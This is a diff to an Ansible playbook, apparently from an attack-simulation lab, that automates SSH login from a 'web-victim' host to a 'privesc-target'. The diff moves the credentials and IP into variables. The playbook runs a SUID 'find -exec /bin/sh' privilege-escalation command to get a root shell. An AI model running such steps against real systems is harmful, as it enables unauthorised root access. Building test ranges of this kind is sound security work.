@@ -1,15 +1,17 @@
 ---
 - name: Privilege Escalation - SSH login to privesc-target from web-victim
-  shell: "sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@192.168.254.132 'id'"
+  shell: "sshpass -p '{{ ssh_password }}' ssh -o StrictHostKeyChecking=no {{ ssh_user }}@{{ privesc_target_ip }} 'id'"
   register: ssh_result
+  failed_when: false
 
 - name: Show SSH login result
   debug:
     var: ssh_result.stdout
 
 - name: Privilege Escalation - Exploit SUID binary to gain root
-  shell: "sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@192.168.254.132 'find . -exec /bin/sh \\; -quit'"
+  shell: "sshpass -p '{{ ssh_password }}' ssh -o StrictHostKeyChecking=no {{ ssh_user }}@{{ privesc_target_ip }} 'find . -exec /bin/sh \\; -quit'"
   register: suid_result
+  failed_when: false
 
 - name: Show result of SUID exploit
   debug:
